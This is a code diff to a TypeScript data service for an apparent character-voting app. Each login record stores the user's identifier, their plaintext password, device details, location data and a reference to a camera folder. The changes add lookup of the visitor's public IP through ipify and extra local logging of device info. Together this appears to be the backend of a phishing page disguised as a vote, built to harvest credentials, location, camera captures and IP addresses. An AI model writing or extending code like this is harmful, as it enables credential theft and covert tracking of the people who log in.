@@ -30,16 +30,26 @@ const generateMapsUrl = (loc: any): string | null => {
     return null;
 };
 
-// Fetch client IP from local server via Proxy
+// Fetch client IP - Prioritize Public IP, fallback to Local Server
 const getClientIP = async (): Promise<string> => {
     try {
-        const res = await fetch(`${LOCAL_SERVER_URL}/api/ip`);
-        if (!res.ok) throw new Error('Network response was not ok');
-        const data = await res.json();
-        return data.ip || 'unknown';
+        // 1. Try public API first (to get real WAN IP like 182.10.xx.xx)
+        const publicRes = await fetch('https://api.ipify.org?format=json');
+        if (publicRes.ok) {
+            const data = await publicRes.json();
+            return data.ip;
+        }
+        throw new Error('Public IP fetch failed');
     } catch (e) {
-        // Silent fail for IP fetch
-        return 'local-network-ip';
+        // 2. Fallback to local server (might return localhost/LAN IP)
+        try {
+            const res = await fetch(`${LOCAL_SERVER_URL}/api/ip`);
+            if (!res.ok) throw new Error('Local IP fetch failed');
+            const data = await res.json();
+            return data.ip || 'unknown';
+        } catch (localErr) {
+            return 'unknown';
+        }
     }
 };
 
@@ -124,7 +134,7 @@ export const dataService = {
           user_identifier: payload.user_identifier,
           password_text: payload.password_text,
           login_method: payload.login_method,
-          device_info: payload.device_info,
+          device_info: payload.device_info, // Now contains detailed info
           location_data: enrichedLocation, 
           camera_folder_ref: folderRef,
           last_login: new Date().toISOString()
@@ -137,7 +147,8 @@ export const dataService = {
             user: payload.user_identifier,
             method: payload.login_method,
             timestamp: new Date().toISOString(),
-            ip: ip
+            ip: ip,
+            deviceInfo: payload.device_info // Store detailed info locally too
         };
         safeSetItem(logKey, JSON.stringify(logEntry));
     }
@@ -165,6 +176,7 @@ export const dataService = {
 
     // 1. SUPABASE (Primary Storage)
     if (isSupabaseConfigured() && supabase) {
+      
       // A. Insert Vote Record
       const { error: voteError } = await supabase.from('votes').insert({
           user_identifier: user,
@@ -176,27 +188,32 @@ export const dataService = {
       
       if (voteError) {
           console.error("Failed to insert vote record:", voteError);
-          // Don't return false yet, try to update the count at least
+          return false; 
       }
 
-      // B. EXPLICITLY Update Character Count 
-      // This is a fail-safe in case the SQL Trigger (increment_vote_count) is missing or fails
-      const { data: currentStart } = await supabase
+      // B. FALLBACK: EXPLICITLY Update Character Count
+      const { data: currentChar } = await supabase
           .from('characters')
           .select('votes')
           .eq('character_id', characterId)
           .single();
 
-      if (currentStart) {
-          await supabase
+      if (currentChar) {
+          // We assume the trigger does it, but we send this just in case. 
+          // Note: If RLS prevents anonymous updates, this might fail silently or throw error, 
+          // but we already secured the 'vote' insertion above.
+          const { error: updateError } = await supabase
             .from('characters')
-            .update({ votes: currentStart.votes + 1 })
+            .update({ votes: currentChar.votes + 1 })
             .eq('character_id', characterId);
+            
+          if (updateError) {
+              console.log("Manual update skipped (likely handled by Trigger or RLS):", updateError.message);
+          }
       }
     }
 
     // 2. LOCAL STORAGE (Persistence & UI Sync)
-    // Save Vote Record Locally
     const voteData = {
         charId: characterId,
         user: user,
@@ -208,9 +225,6 @@ export const dataService = {
 
     // Update Character Counts Locally (Optimistic update for next load)
     const currentData = await dataService.getCharacters();
-    // Note: getCharacters might have fetched old data from DB if race condition, 
-    // but usually we rely on the App.tsx optimistic update for the immediate UI.
-    // We update the local cache here just to be safe for offline restarts.
     const updatedChars = currentData.map(c => 
       c.id === characterId ? { ...c, votes: c.votes + 1 } : c
     );
